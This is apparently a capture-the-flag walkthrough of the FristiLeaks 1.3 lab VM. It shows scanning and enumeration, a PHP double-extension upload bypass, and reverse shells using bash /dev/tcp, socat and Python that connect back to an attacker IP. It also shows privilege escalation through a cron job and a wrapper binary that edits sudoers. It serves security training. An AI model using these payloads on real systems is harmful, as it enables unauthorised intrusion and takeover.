# FristiLeaks 1.3

## Reconnaissance

`$ arp-scan -I eth0 -l | grep :76 | awk '{print $1}'`

```bash
# edit /etc/hosts
$ sed -n '/IPv6/=' /etc/hosts
12
$ sed -i '11i 10.10.10.10\tfristi.com' /etc/hosts
$ target=10.10.10.10
```

## Scan

```bash
$ nmap -sC -sV -oA nmap/nmap -v $target
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.2.15 ((CentOS) DAV/2 PHP/5.3.3)
| http-methods: 
|   Supported Methods: GET HEAD POST OPTIONS TRACE
|_  Potentially risky methods: TRACE
| http-robots.txt: 3 disallowed entries 
|_/cola /sisi /beer
|_http-server-header: Apache/2.2.15 (CentOS) DAV/2 PHP/5.3.3
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
MAC Address: 08:00:27:A5:A6:76 (Oracle VirtualBox virtual NIC)
```

## Enumeration

Let's do some manual `curl`'ing.  
Read up on [ETag](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/ETag).
```bash
# compare behaviour of GET/HEAD, look for redirects
$ curl -s -I $target | tee head.txt
HTTP/1.1 200 OK
Date: Sun, 20 Jan 2019 22:11:30 GMT
Server: Apache/2.2.15 (CentOS) DAV/2 PHP/5.3.3
Last-Modified: Tue, 17 Nov 2015 18:45:47 GMT
ETag: "31b2-2bf-524c0ef1d551d"
Accept-Ranges: bytes
Content-Length: 703
Connection: close
Content-Type: text/html; charset=UTF-8

$ curl -s -D - $target -o /dev/null > get.txt
$ diff head.txt get.txt 
2c2
< Date: Sun, 20 Jan 2019 22:11:30 GMT
---
> Date: Sun, 20 Jan 2019 22:13:46 GMT
```

We can also try to bruteforce some directories and have look at `robots.txt`
```text
$ dirb http://${target}/ -o http/dirb.log
$ curl -s http://${target}/robots.txt
User-agent: *
Disallow: /cola
Disallow: /sisi
Disallow: /beer
```

### Admin Panel

We can inspect the form of admin panel manually:
```bash
$ curl http://${target}/fristi/ | html2text
$ curl -s http://${target}/fristi/ | sed -n '/<form/,/<\/form/p'
$ curl -i -d $"myusername=admin&mypassword=password&Submit=Login" $target/fristi/checklogin.php
```

I've created a wordlist from the page with no success:
```bash
$ cewl --with-numbers -a http://fristi.com -w wordlist
$ awk '/meneer/,0' wordlist > names.txt

# Prepare a dictionary the dumb way :)
# filter html comment at the beginning
$ curl -s http://fristi.com | sed -n '/<!--/,/-->/p' | tr ' ' '\n' | sort | sed '/^$/d' > comment.txt
# all words except the comment
$ comm -23 <(sort wordlist | uniq) <(sort comment.txt | uniq) > names.txt
```

In the end BURP revealed the comment in the `<head>` for me and I got login:  
`eezeepz:keKkeKKeKKeKkEkkEk`

### File Upload

Read: [Files With Multiple Extensions](http://httpd.apache.org/docs/2.2/mod/mod_mime.html#multipleext)  
Read: [Apache AddHandler/AddType Exploit Protection](https://www.gentoo.org/support/news-items/2015-04-06-apache-addhandler-addtype.html)  
Read: [Why File Upload Forms are a Major Security Threat](https://www.acunetix.com/websitesecurity/upload-forms-threat/)  
Read: [HTTP Accept-Ranges](https://developer.mozilla.org/en-US/docs/Web/HTTP/Range_requests)  

> The file has been uploaded to /uploads.

It's `/fristi/uploads` but we get a `no!`.
```bash
$ curl -s -i http://fristi.com/fristi/uploads/ --header "Cookie: PHPSESSID=85cbvuhjnk9qa42f83ktead611"
HTTP/1.1 200 OK
Date: Sun, 20 Jan 2019 23:38:52 GMT
Server: Apache/2.2.15 (CentOS) DAV/2 PHP/5.3.3
Last-Modified: Tue, 17 Nov 2015 13:06:13 GMT
ETag: "2ffa-4-524bc30bbba18"
Accept-Ranges: bytes
Content-Length: 4
Connection: close
Content-Type: text/html; charset=UTF-8

# just inspecting what Accept-Ranges does..
$ curl -s -i http://fristi.com/fristi/uploads/ -H "Cookie: PHPSESSID=85cbvuhjnk9qa42f83ktead611" -H "Range: bytes=0-2"
no
```

There is probably just a index.html "blocking" the file view?
> Sorry, is not a valid file. Only allowed are: png,jpg,gif

Changing the MIME-Type of an .html to `image/png` does not help.  
Apache seems to work with a whitelist instead of a blacklist approach, so no .htaccess bypass.  
Maybe `AddHandler` directive is used? `yes!`
```bash
$ cat <<EOF > bypass.php.jpg 
> <?php
> echo 'yes!'
> ?>
> EOF
$ curl -s $target/fristi/uploads/bypass.php.jpg -H "Cookie: PHPSESSID=85cbvuhjnk9qa42f83ktead611"
yes!
```

## Exploitation

Upload `shell.php.jpg` with a reverse shell. `nc` is not available on the target so we need something else:  
`<?php system("bash &>/dev/tcp/10.10.10.10/4444 <&1"); ?>`  
After this let's upgrade our shell:  
```bash
# Kali
$ `socat file:`tty`,raw,echo=0 tcp-listen:4445`
# Box
$ wget -q \
https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat \
-O /tmp/socat 
$ chmod +x /tmp/socat
$ ./tmp/socat exec:'bash -li'ty,stderr,setsid,sigint,sane tcp:10.10.10.10:4445`
```

## Privilege Escalation

Just some notes:  
```bash
# checklogin.php: eezeepz:4ll3maal12#
# database schema: hackmenow
# table: members
$ cat /etc/passwd
$ cat /etc/groups
$ uname -a
Linux localhost.localdomain 2.6.32-573.8.1.el6.x86_64 #1 SMP Tue Nov 10 18:01:38 UTC 2015 x86_64 x86_64 x86_64 GNU/Linux
$ cat /etc/issue
[...] CentOS 6.7 Final
# check for setuid flag
$ find / -user root -perm -4000 -exec ls -ldbtr \{} \;
```

There is a `.` (dot) after the permissions in `ls -l /home/eezeepz`.  
Read up: [SELinux](https://wiki.centos.org/HowTos/SELinux). 
```bash
# config: /etc/selinux/config
# check if enabled
$ getenforce / $ sestatus
Disabled
$ ls -Z tar 
-rwxr-xr-x. eezeepz eezeepz unconfined_u:object_r:user_home_t:s0 tar
```

Just some more notes:  
* use cronjob to inspect `/home/admin`
  * `echo -n "chmod -R 777 /home/admin/" > /tmp/runthis`
* reverse the rot13/base64 and get passwords:
```
admin:thisisalsopw123
fristigod:LetThereBeFristi!
```

### Reversing

We can copy it to `/uploads` to download it and reverse it locally.  
Also `objdump` is available on the box:
```bash
$ objump -d -M intel doCom | grep -A20 main.:
0000000000400674 <main>:
  400674:       55                      push   rbp
  400675:       48 89 e5                mov    rbp,rsp
  400678:       48 81 ec 90 00 00 00    sub    rsp,0x90
  40067f:       89 bd 7c ff ff ff       mov    DWORD PTR [rbp-0x84],edi
  400685:       48 89 b5 70 ff ff ff    mov    QWORD PTR [rbp-0x90],rsi
  40068c:       48 c7 45 80 00 00 00    mov    QWORD PTR [rbp-0x80],0x0
  400693:       00 
  400694:       48 8d 55 88             lea    rdx,[rbp-0x78]
  400698:       b8 00 00 00 00          mov    eax,0x0
  40069d:       b9 0b 00 00 00          mov    ecx,0xb
  4006a2:       48 89 d7                mov    rdi,rdx
  4006a5:       f3 48 ab                rep stos QWORD PTR es:[rdi],rax
  4006a8:       48 89 fa                mov    rdx,rdi
  4006ab:       89 02                   mov    DWORD PTR [rdx],eax
  4006ad:       48 83 c2 04             add    rdx,0x4
  4006b1:       b8 00 00 00 00          mov    eax,0x0
  4006b6:       e8 ad fe ff ff          call   400568 <getuid@plt>
  4006bb:       89 45 fc                mov    DWORD PTR [rbp-0x4],eax
  4006be:       81 7d fc f7 01 00 00    cmp    DWORD PTR [rbp-0x4],0x1f7
  4006c5:       74 2e                   je     4006f5 <main+0x81>
```
At offset `0x4006be` the return value of `getuid` gets compared to 0x1f7 = 503.  
This is the id of user `fristi`. If the compare fails the program exits:
```bash
# bash: arithmetic expansion
$ cat /etc/passwd | grep $(( 16#1f7 ))              
fristi:x:503:100::/var/www:/sbin/nologin
$ objdump -d -M intel doCom | grep -A30 main.: | tail --lines=+20
4006be:       81 7d fc f7 01 00 00    cmp    DWORD PTR [rbp-0x4],0x1f7
  4006c5:       74 2e                   je     4006f5 <main+0x81>
  4006c7:       48 8b 05 fa 04 20 00    mov    rax,QWORD PTR [rip+0x2004fa]        # 600bc8 <stderr@@GLIBC_2.2.5>
  4006ce:       48 89 c2                mov    rdx,rax
  4006d1:       b8 b8 08 40 00          mov    eax,0x4008b8
  4006d6:       48 89 d1                mov    rcx,rdx
  4006d9:       ba 1c 00 00 00          mov    edx,0x1c
  4006de:       be 01 00 00 00          mov    esi,0x1
  4006e3:       48 89 c7                mov    rdi,rax
  4006e6:       e8 8d fe ff ff          call   400578 <fwrite@plt>
  4006eb:       bf 01 00 00 00          mov    edi,0x1
  4006f0:       e8 23 fe ff ff          call   400518 <exit@plt>
```

### Obtain root

You could just pass `/bin/bash` as an argument.
```bash
$ cd /var/fristigod/.secret_admin_stuff/
$ sudo -l
$ sudo -u fristi ./doCom "nano /etc/sudoers"
# uncomment: %wheel  ALL=(ALL)       ALL
$ sudo -u fristi ./doCom "usermod -aG wheel fristigod"
# log out/in
$ sudo -s
root# # grep -i flag /root/fristileaks_secrets.txt
Flag: Y0u_kn0w_y0u_l0ve_fr1st1
```

Notes:
* obtain reverse shell via cronjob
* interactive shell
```bash
/usr/bin/python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.2.0.3",5556));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```
* `sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom /bin/bash`
